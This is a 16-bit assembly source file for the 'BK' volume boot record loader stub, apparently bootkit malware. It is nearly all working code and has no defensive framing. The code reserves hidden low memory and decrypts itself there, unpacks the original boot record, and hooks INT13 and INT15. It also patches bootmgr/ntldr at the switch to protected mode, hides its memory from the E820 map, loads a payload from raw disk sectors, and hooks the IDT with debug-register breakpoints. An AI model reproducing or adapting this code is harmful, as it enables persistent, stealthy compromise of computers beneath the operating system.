;//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
;// BK initial loader stub. Version 2.9.2
;//	
;// module: vbs16.asm
;// $Revision: 43 $
;// $Date: 2012-05-07 16:50:57 +0400 (Пн, 07 май 2012) $
;// description: 
;//	 BK Volume Boot Record. 16-bit functions.


.model tiny, stdcall
.386p		;// when processor directive after the ".model" MASM generates 16-bit code ;)

LOADER_SIZE				equ	 (15 * 200h)						;// 15 sectors in bytes	
TARGET_CODE_SEGMENT		equ  100h


.code

include	<vbr.inc>
include <variables.h>


;// ---- Public symbols ----------------------------------------------------------------------------------------------------
PUBLIC	Core16_start
PUBLIC	Core16_end
PUBLIC	Entry16_start
PUBLIC	Entry16_end
PUBLIC	Startup16_start
PUBLIC	Startup16_end

PUBLIC	Main16_start
PUBLIC	Main16_end
PUBLIC	Ofs_start
PUBLIC	Ofs_end

PUBLIC	Unpack_start
PUBLIC	Unpack_end
PUBLIC	DoMatch_start
PUBLIC	DoMatch_end
PUBLIC	GetBit_start
PUBLIC	GetBit_end
PUBLIC	NormalCp_start
PUBLIC	NormalCp_end
PUBLIC	GetGamma_start
PUBLIC	GetGamma_end

PUBLIC	Handler15_start
PUBLIC	Handler15_end
PUBLIC	Handler13_start
PUBLIC	Handler13_end
PUBLIC	PmInit_start
PUBLIC	PmInit_end

PUBLIC	PatchLdr_start
PUBLIC	PatchLdr_end
PUBLIC	HookIdt_start
PUBLIC	HookIdt_end

PUBLIC	LoadData_start
PUBLIC	LoadData_end




;// Calls block by it's index
Core16_start::
Core16 proc
	push ax
	test bp, bp
	push var_offset_table
	xor ax,ax
	pop ax
	jnz Core32

;// 16-bit code
	push ds
	push si
	push bp
	mov bp, sp

	push cs
	pop ds
	mov	si, [bp+8]
	inc word ptr [bp+8]
	movzx si, byte ptr [si]
	shl si, 1
	add si, ax
	add si, [bp]
	mov ax, [si]
	add ax, [bp]
	xchg ax, [bp+6]

	pop bp
	pop si
	pop ds
	ret

Core32:
;// 32/64-bit code
	pop ax						;	//	pop eax
	inc word ptr [si]			;	//	inc [esp]
	and al, 58h					;	//	pop eax
	push ax
	push cx
	push bx

	push var_offset_table
	xor ax,ax
	pop bx

	movzx cx, byte ptr [bx+si-1]
	dec ax
	db 0fh, 0bfh, 0dbh			;	//	movsx ebx, bx
	shl cx, 1
	dec ax
	add bx, cx
	dec ax
	db 0fh, 0bfh, 1ch, 2bh		;	//	mosx ebx, word ptr [ebp+ebx]
	dec ax
	add bx, bp
	dec ax
	xchg ax, bx
	pop bx
	pop cx
	push ax
	ret
Core16_end::
Core16 endp


;// Calculates offset of a block by it's index.
Ofs_start::
Ofs	proc
	push bx
	movzx ax, cl
	shl ax, 1

	test bp, bp
	push var_offset_table
	xor bx, bx
	jnz Ofs32

;// 16-bit offset
	push cs
	pop ds
	pop bx
	add ax, bp
	add bx, ax
	mov ax, word ptr [bx]
	add ax, bp
	pop bx
	ret

Ofs32:
;// 32-bit offset
	pop bx
	push cx
	xchg ax, cx
	dec ax
	db	0fh,0bfh,0dbh		;// movsx	ebx, bx
	dec ax
	add bx, cx
	dec ax
	db 0fh, 0bfh, 1ch, 2bh	;	//	mosx ebx, word ptr [ebp+ebx]
	dec ax
	add bx, bp
	dec ax
	xchg ax,bx
	pop cx
	pop bx
	ret
Ofs	endp
Ofs_end::



Entry16_start::
VBREntry	proc
	mov ax, cs
	mov ds, ax
	shl ax, 4
	cli
	mov sp, ax
	sti
	call	bp
	db F_Startup
Entry16_end::
VBREntry	endp

VBRStartup	proc
Startup16_start::
;// ---- Stack frame for future RETF

	pop ax
	sub ax, var_entry_size
	push cs		;// RETF cs
	push ax		;// RETF ip
;// ---- Base Frame -------------
	push ds
	push es
	pusha
;// -----------------------------

	;// Decrementing base memory size on a size of our code (allocating a code segment for BK)
	mov di, 13h
	push 40h
	pop ds
	mov cx, [di]	;//  BDA.MemorySize (Kb)
	sub ecx, 3
	mov [di], cx
	shl cx, 6		;//  our code segment

	push cs
	pop ds

	mov bx, sp
	mov bp, var_offset_core

;// Copying code to the allocated code segment
	push ax		;// beginning of the code
	push cx		;// our code segment
	add ax, var_entry_size
	mov si, ax
	add bp, ax
	xor di, di
	pop es

	mov dx, var_code_xor
	cld
	mov cx, var_code_words
@@:
	mov ax, [si]
	xor ax, dx
	mov es:[di], ax
	add si, 2
	add di, 2
	loop @B

	pop di		;// beginning of the code
	
	mov ax, var_block0_ofs

	push es		;// will be CS for RETF to the Main function within new segment
	push ds
	pop es

	mov cx, var_offset_core
	add ax, cx

	mov si, var_packed_ldr

	push ax		;// will be offset for RETF to a Main function within new segment
	push cx		;// will be new BP

	add si, bp

;// Initializing new CORE pointer and jumping to the Main function within new segment
	pop bp
	retf
Startup16_end::
VBRStartup	endp


;// Unpacks original VBR and hooks INT13, then starts original VBR.
Main16_start::
VBRMain	proc
;// bx - pointer to the base frame
;// si - packed loader
;// di - place to unpack the loader

;// Unpacking original loader
	push bx
    mov    dl, 80h
    xor    ebx, ebx

	mov cx, NTFS_LOADER_SIZE
	push di
	add di, cx
	push di
	rep movsb

	pop si
	pop di

;	push di

	call bp
	db F_Unpack

;	pop di

;// ---------------------------------------------------------------------------------------------------------------------
;// Saving original loader back to the disk (for debugging only)
;//	ds:si - loader position
;// es:di - loader end

;	and di, (not 0ffh)
;	xor eax,eax

;	mov si, di
;	add di, 1200h
;	mov cx, 0e00h
;	cld
;	rep stosb	

;//	DAP.StartSector
;	push eax
;	push ax
;	push 64		;// XP
;;	push 801h	;// 7

;// DAP.Buffer
;	push ds
;	push si	

;// DAP.Count
;	push 15

;// DAP.Size
;	push 10h

;	push ss
;	pop ds

;	mov si, sp
;	mov ax, 4300h
;	mov dl, 80h
;	int 13h

;	add sp, 10h	
;// --------------------------------------------------------------------------------------------------------------------


;// Loading payload data from a disk
	call bp
	db F_LoadData

	;// Initializing segments
	mov ax, cs
	mov es, ax

;// Setting interrupt hooks
;// Hooking INT13
;	GETPTR	F_Handler13
;	mov di, ax
;	add di,(Offset13 - Handler13)
;	mov si, 04ch
;	push 0
;	pop ds
;
;	cli
;	movsd
;	mov [si-4], ax
;	mov [si-2], es
;	sti
;// Hooking INT15
	GETPTR	F_Handler15
	mov di, ax
	add di,(Offset15 - Handler15)
	mov si, 054h
	push 0
	pop ds

	cli
	movsd
	mov [si-4], ax
	mov [si-2], es
	sti

	pop bx
	mov sp, bx
	popa
	pop es
	pop ds
	retf
VBRMain_end::
VBRMain	endp
Main16_end::


;// Allocates amount of base memory enough to store the payload data.
;// Loads payload from a disk using INT13 service.
LoadData_start::
LoadData proc
	GETPTR	F_FileName

	push ss
	pop es

;// Building DAP
	xchg ax, si
	xor cx, cx
	sub sp, 8
	mov di, sp
;// DAP.StartSector
	movsd
	movsd
	lodsw

;// Decrementing base memory size on a size of the payload
	mov di, 13h
	push ax			;//	 Number of sectors to read
	push 40h
	pop ds
	mov cx, [di]	;//  BDA.MemorySize (Kb)
	shr ax, 1
	inc ax
	sub cx, ax
	mov [di], cx
	shl cx, 6


	push cs
	pop ds

;// Saving payload address segment
	mov [si-10], cx

	pop di			;// Number of sectors to read


;// Reading data sectors
;// Since some of BIOSes unable to read more then 127 sector once a time, reading by bunches of 127 sectors
@1:
	push 7fh
	pop dx

;// DAP.Buffer
	push cx
	push 0

	cmp di, dx
	jae @F
	mov dx, di
@@:

;// DAP.NumberSectors
	push dx
;// DAP.Length
	push 10h

;// Loading data
	push ss
	pop ds
	mov si, sp
	mov dl, 80h
	mov ah, 42h
	int 13h	

	xor edx,edx
	pop dx
	pop dx
;// Checking if we read all
	sub di, dx
	jz @F

;// Incrementing Buffer and StartSector, restoring DAP
	pop cx		;// DAP.Buffer (offset)
	pop cx		;// DAP.Buffer (segment)
	pop eax		
	pop ebx		;// DAP.StartSector hi

	add eax, edx
	shl dx, 5
	add cx, dx

	push ebx	;// DAP.StartSector hi
	push eax	;// DAP.StartSector low
	jmp @1

@@:
	add sp, 12
	ret
LoadData endp
LoadData_end::


;// INT13 handler.
;// Executes when VBR loads Ntdlr(bootmgr) from disk.
;// Scans loaded data for the 0F-22-C0 (MOV CR0, EAX) signature and patches as this point to receive control 
;//  just before switching to PM.
Handler13_start::
Handler13	proc
	pushf
	cmp ah, 02h
	jz Process13
	cmp ah, 42h
	jz Process13
	popf
Leave13:
	db	0eah
Offset13	dw ?
Segment13	dw ?

Process13:
	popf
	push ds
	push es
	push bx
	push di

	cmp ah, 2
	jz Process13_call

;// BOOTMGR doesn't check if the WINLOAD fits the avliable low-memory, it just assumes there are more then 512KBs.
;// Since WINLOAD is being loaded by sectors there some empty sectors at the end of it. We can skip loading them 
;//  without a trouble.
;//	Here we check if the target memory buffer is within the avaliable low-memory. We adjust number of sectors to read or
;//  even skip reading if the buffer is beyond the memory limit. 
	push ds
	mov di, 13h
	mov bx, word ptr [si+6]	;// memory buffer segment
	push 40h
	pop ds
	mov di, [di]			;// BDA.MemorySize (Kb)
	mov es, bx
	shl di, 6
	pop ds
	sub di, bx
	ja @F
	;// The buffer starts beyond the low-memory limit, exiting.
	clc
	mov ah, 0
	jmp Process13_end
@@:
;	mov bx, word ptr [si+2]	;// number of sectors to read
;	shr di, 5
;	cmp di, bx
;	jae @F
	;// The size of the buffer exceeds the low-memory limit, adjusting number of sectors to read.
;	mov word ptr [si+2], di
;	nop
;@@:
	mov bx, word ptr [si+4]	;// memory buffer offset
Process13_call:
	call Next13
Next13:
	pop di
	add di, (Offset13 - Next13)

	pushf
	call dword ptr cs:[di]
	nop
	nop
Process13_end:
	pop di
	pop bx
	pop es
	pop ds
	retf 02
Handler13	endp
Handler13_end::


;// INT15 handler.
;// Executes while system starts. Processes 0xE820 function only.
;// Scans all memory regions returned and cuts off the region used by the BK body and payload data.
;// Since some BIOSes do not synchronize BDA.MemorySize changes we have to do it here.
Handler15_start::
Handler15	proc
	pushf
	push bp
	mov bp, sp
	cmp word ptr [bp+6], 9000h
H15_check_jmp:
;// Following instruction will be patched to avoid multiple hooks
	jae H15_check_function
	call H15_check_ldr
H15_check_function:
	pop bp
	cmp ax, 0e820h
	jz Process15
	popf
Leave15:
	db	0eah
Offset15	dw ?
Segment15	dw ?

H15_check_ldr:
	push ds
	push es
	pushad

	push [bp+6]		;//	caller's segment
	pop es

;// Searching for the signature and patching loader at this point
	push cs
	pop ds
	mov cx, 4000h
	xor di, di
	cld
@@:
	mov al, 0fh
	repnz scasb
	jcxz @F

;// Looking for 0F-22-C0-87-DB signature, that is "MOV CR0, EAX / XCHG BX, BX"
	mov eax, dword ptr es:[di]
	cmp eax, 0db87c022h
	jnz @B

;// Resolving and patching H15_check_jmp instruction
	mov si, [bp-2]	;// retpoint of H15_check_ldr
	add si, (H15_check_jmp - H15_check_function)
	mov bp, var_offset_core
	mov byte ptr [si], 0ebh
	nop

;// Patching ntldr (bootmgr)
	call bp
	db F_PatchLdr

@@:
	popad
	pop es
	pop ds
	ret

Process15:
	popf
	push si

	call Next15
Next15:
	pop si
	add si, (Offset15 - Next15)

;// Calling original function by pointer
	pushf
	call dword ptr cs:[si]
	jc Process15_end

;// Processing returned data
	pushf
	pushad
	push ds
	push 0
	pop ds

;// Checkinh if returned region is low memory region
	xor eax,eax
	cmp dword ptr es:[di+4], eax	;// region address Hi
	jnz Handler15_exit

;// Cheking if returned region starts earlier then EBDA
	mov ax, ds:[40eh]	;// BDA.EBDA
	shl eax, 4

	mov ecx, es:[di]	;// region address Low
	cmp ecx, eax
	jae Handler15_exit

;// Adjusting size of the region to the current memory size (already adjusted by BK)
	xor edx, edx
	mov dx, ds:[413h]	;// BDA.MemorySize (Kb)
	shl edx, 10

	sub edx, ecx
	mov es:[di+8], edx	;// region size Low

Handler15_exit:
	pop ds
	popad
	popf
Process15_end:
	pop si
	retf 02
Handler15	endp
Handler15_end::



;// Patches Ntldr(bootmgr) to execute PmInit function.
PatchLdr_start:
PatchLdr	proc
;//	ES:DI - poins to instruction to patch
	
	dec di
	mov bx, var_code_size
;// Saving original code bytes
	mov ax, es:[di]
	mov [bx], ax
	mov eax, es:[di+2]
	mov [bx+2], eax

	mov [bx+6], bp

;// Patching loader	
	mov al, 9ah
	stosb
	GETPTR	F_PmInit
	stosw
	mov ax, cs
	stosw
PatchLdr_exit:
	ret
PatchLdr	endp
PatchLdr_end:



;// Hook function.
;//	Resolves IDT and sets 2 DR-breaks: 1 on IDT write attempt and 1 on executing OSLoader entry.
PmInit_start::
PmInit	proc
	pusha
	push ds
	push es
	push cs
	pop ds

	mov bp, sp
	mov di, [bp+14h]	;// old IP
	push [bp+16h]		;// old CS
	pop es

;// Restoring retpoint 
	sub di, 5
	mov [bp+14h], di

;// Restoring original bytes
	mov si, var_code_size
	movsw
	movsd

;// Resolving IDT base and size
	push ecx
	sidt fword ptr [bp-6]

;// Restoring CORE pointer
	mov bp, [si]
	pop ecx				;// IDT base

;// Hooking IDT and setting breakpoints
	call bp
	db F_HookIdt

;// Cleaning up INT15 hook
	push cs
	pop ds

	GETPTR	F_Handler15
	add ax, (Offset15-Handler15_start)
	push 0
	pop es
	xchg ax, si
	mov di, 054h
	movsd

;// Leaving	
	pop es
	pop ds
	popa
	retf
PmInit	endp
PmInit_end::


;// Reallocates BK body, hooks INT1 and sets breakpoints.
HookIdt_start::
HookIdt proc
;//	ECX - Curent IDT base

;// Resolving INT1 handler offset
	push ecx		;// IDT base

	xor ebx, ebx
	mov bx, cs
	shl ebx, 4

	xor eax,eax
	GETPTR	F_Int1Handler

	xchg eax, ebx
	mov [bx+CODE_BASE_OFFSET], eax
	add eax, ebx		;// Handler LA

;// Initializing DR0 and DR1 to the IDT base
	pop ebx				;// IDT base
	mov dr0, ebx
	push bx				;// IDT base low

	add bx, 8
	mov ecx, ebx
	and bx, 0fh
	shr ecx, 4
	mov ds, cx
	
;// Setting INT1 handler 
	mov [bx], ax		;// segment low-bits
	shr eax, 16
	pop cx
;// Checking OS type: 
;//	NT5 places IDT aligned at 100h bytes while NT6 alignes at 80h
	test cl, cl
;// NT5 uses code segment selector 8
	mov cx, 8
	jz @F
;// NT6 uses code segment selector 20h
	mov cx, 20h
@@:
	mov [bx+2], cx		;// selector
	mov [bx+6], ax		;//	segment hi-bits

;// Setting execution break on OSLoader entry (NT5 only)
;// Ntldr always locates OSLoader.exe at 400000h. The entry point of OSLoader is always 401000h.
	mov eax, 401000h
	mov dr2, eax
	
;// Enabling read/write breakpoint for R0 and execute for R2
	mov eax, 00030622h
	mov dr7, eax
	ret
HookIdt	endp
HookIdt_end::



;// ---- Unpacking original loader -----------------------------------------------------------------------------------


Unpack_start::
Unpack	proc
	push	eax		;// variable
_literal:
    movsb
    mov    bl, 2
nexttag:
    call   bp
	db	F_GetBit
    jnc    _literal

    xor    ecx, ecx
    call   bp
	db	F_GetBit
    jnc    codepair
    xor    eax, eax
    call   bp
	db	F_GetBit
    jnc    shortmatch
	add		ecx, 1
    mov		al, 10h
	mov		bl, 2
getmorebits:
    call   bp
	db	F_GetBit
    adc    al, al
    jnc    getmorebits
    jnz    domatch
    stosb
    jmp    nexttag
codepair:
    call   bp
	db F_GetGamma
    sub    ecx, ebx
    jnz    normalcodepair
	xor	   ecx,	ecx
    call   bp
	db F_GetGamma
    jmp    domatch_lastpos

shortmatch:
    lodsb
    shr    eax, 1
    jz     pop_and_end
    adc    ecx, ecx
    jmp    domatch_with_2inc

normalcodepair:
	call bp
	db F_NormalCp

    cmp    eax, 32000
    jae    domatch_with_2inc
    cmp    ah, 5
    jae    domatch_with_inc
    cmp    eax, 7fh
    ja     domatch_new_lastpos

domatch_with_2inc:
    inc    ecx

domatch_with_inc:
    inc    ecx

domatch_new_lastpos:
;    mov		[esp], eax
	add		sp, 4
	push	eax
domatch_lastpos:
	pop		eax
	push	eax
    mov		bl, 1

domatch:
	call bp
	db F_DoMatch
    jmp    nexttag
pop_and_end:
	pop		ecx
Unpack_end::
	ret
Unpack	endp

DoMatch_start::
DoMatch		proc
    push   si
    mov    si, di
    sub    si, ax
    rep    movsb
    pop    si
DoMatch_end::
	ret
DoMatch		endp

GetBit_start::
GetBit	proc
    add    dl, dl
    jnz    GetBit_end
    mov    dl, [si]
    inc    si
    adc    dl, dl
GetBit_end::
    ret
GetBit endp

GetGamma_start::
GetGamma	proc
    inc		ecx
getgammaloop:
    call	bp
	db	F_GetBit
    adc		ecx, ecx
    call	bp
	db	F_GetBit
    jc     getgammaloop
GetGamma_end::
    ret
GetGamma	endp

NormalCp_start::
NormalCp	proc
	xchg	eax, ecx
    dec		eax
    shl		eax, 8
    lodsb
	xor		ecx,ecx
    call	bp
	db F_GetGamma
NormalCp_end::
	ret
NormalCp	endp



end